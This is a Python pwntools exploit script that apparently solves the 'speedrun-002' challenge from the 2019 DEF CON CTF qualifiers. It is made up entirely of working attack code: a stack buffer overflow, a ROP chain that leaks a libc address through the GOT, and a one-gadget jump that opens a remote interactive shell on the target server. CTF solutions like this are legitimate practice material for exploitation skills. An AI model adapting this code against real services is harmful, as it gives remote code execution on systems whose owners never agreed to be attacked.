from pwn import *

p = remote('speedrun-002.quals2019.oooverflow.io', 31337)
# p = process('./speedrun-002')
e = ELF('./speedrun-002')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'

rsi_r15 = 0x00000000004008a1

p.recvuntil('?')

p.send('Everything intelligent is so boring.')

p.recvuntil('more.')

chain = [
    rsi_r15,
    e.got['puts'],
    0,
    e.symbols['write'],
    0x4007CE
]

p.send('A' * 0x408 + flat(chain, word_size=64))

p.recvline()
p.recvline()
libc_base = u64(p.recvn(8)) - libc.symbols['puts']
print(hex(libc_base))

p.recvuntil('?')

p.send('Everything intelligent is so boring.')

p.recvuntil('more.')

chain = [
    rsi_r15,
    e.got['puts'],
    0,
    e.symbols['write'],
    0x4007CE
]

p.send('A' * 0x408 + p64(libc_base + 0x4f322) + '\x00' * 100)

p.interactive()
